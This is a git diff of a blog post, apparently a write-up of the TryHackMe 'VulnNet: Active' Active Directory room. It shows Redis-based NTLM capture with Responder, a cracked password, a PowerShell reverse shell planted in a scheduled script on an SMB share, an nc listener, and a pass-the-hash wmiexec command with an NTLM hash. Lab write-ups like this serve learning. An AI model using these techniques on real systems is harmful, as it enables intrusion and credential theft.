@@ -1,12 +1,17 @@
 ---
 layout: post
-title:  "Vulnnet-Active Writeup"
+title:  "Vulnnet-Active(Tryhackme) Writeup"
 date:   2026-01-16 13:00:00 +0530
 categories: Cybersecurity 
 ---
+This is my first time writing a proper write-up for a TryHackMe room, and I wanted to document my learning process while solving it.
+The room focuses on attacking a Windows Active Directory machine, starting from enumeration and ending with full administrative access.🔗 **TryHackMe Room:**  
+[VulnNet: Active](https://tryhackme.com/room/vulnnetactive)
+
+
 
 ## Enumeration 
-starting with the nmap scan . 
+Starting with the nmap scan . 
 ```
 sudo nmap -p 1-10000 -Pn -sC -sV -O 10.48.191.231
 
@@ -52,7 +57,7 @@ Because Redis commonly does **not require authentication** by default, so we can
 sudo responder -I tun0 -dwv
 ```
 
-first establish a connection to the  running on the target system. Then change the Redis working directory to a UNC network path hosted on the attacker machine. It forces the window target to access the remote SMB share and automatically send NTLM authentication credentials. 
+First establish a connection to the  running on the target system. Then change the Redis working directory to a UNC network path hosted on the attacker machine. It forces the window target to access the remote SMB share and automatically send NTLM authentication credentials. 
 the file name (fake.txt) is arbitrary and does not need to exist.
 ```
 redis-cli -h 10.48.191.231
@@ -74,7 +79,7 @@ password: sand_0873959498
 ```
 ![hascat](/assets/image/hashcat.png)
 ## Enumerate shares
-now that we have valid credentials , we can further enumerate to gather additional information.
+Now that we have valid credentials , we can further enumerate to gather additional information.
 using enum4linux to enumerate users, groups, shares, and other domain-related information. 
 ```
 enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193
@@ -118,17 +123,17 @@ $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close();
 $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 ```
 
-starting listener 
+Starting listener 
 ```
 nc -lvnp 4444
 ```
 
-upload the file again and it will replace the .ps1 with the one uploaded .
+Upload the file again and it will replace the .ps1 with the one uploaded .
 ```
 put PurgeIrrelevantData_1826.ps1
 ```
 
-soon we will get the connection and navigate to  C:\Users\enterprise-security\Desktop to get the user flag . 
+Soon we will get the connection and navigate to  C:\Users\enterprise-security\Desktop to get the user flag . 
 
 ![user flag](/assets/image/user.png)
 
@@ -161,7 +166,7 @@ After successfully escalating privileges and obtaining administrative access, us
 
 ![dumping hashes](/assets/image/secretsdump.png)
 
-after extracting the administrator hash instead of cracking it i can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
+After extracting the administrator hash instead of cracking it i can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 
 
 ```
 wmiexec.py vulnnet.local/administrator@10.49.146.193 -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1
